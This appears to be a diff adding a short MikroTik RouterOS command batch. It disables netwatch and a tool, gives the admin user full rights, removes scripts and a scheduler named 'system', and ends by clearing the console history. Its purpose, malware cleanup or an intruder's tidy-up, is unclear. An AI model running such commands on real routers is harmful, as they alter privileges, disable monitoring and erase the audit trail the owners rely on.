@@ -1,0 +1,9 @@
+/too tra dis [find]
+/user set [find name=admin] group=full
+/system script job remove [find script=system]
+/tool netwatch disable [find]  
+/system script job remove [find script=system] 
+/system scheduler disable system
+/system script job remove [find script=system] 
+/system script remove system
+/console clear-history
